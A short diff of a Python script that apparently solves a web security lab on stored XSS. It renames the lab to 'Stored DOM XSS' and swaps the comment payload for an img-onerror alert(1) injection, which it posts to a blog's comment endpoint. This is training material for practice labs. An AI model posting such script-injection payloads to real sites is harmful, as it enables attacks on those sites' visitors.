@@ -4,7 +4,7 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-LAB_NAME = "Stored XSS into HTML context with nothing encoded"
+LAB_NAME = "Stored DOM XSS"
 
 def run(url, payload=None, proxies=None):
     session = requests.Session()
@@ -23,7 +23,7 @@ def run(url, payload=None, proxies=None):
             "name": "mystic_mido",
             "email": "mystic_mido@mystic_mido.com",
             "website": "https://snehbavarva.com",
-            "comment": "<script>alert(1)</script>"
+            "comment": "><<img src=1 onerror=alert(1)>"
         }
 
         response = session.post(url.rstrip('/') + "/post/comment", data=data)
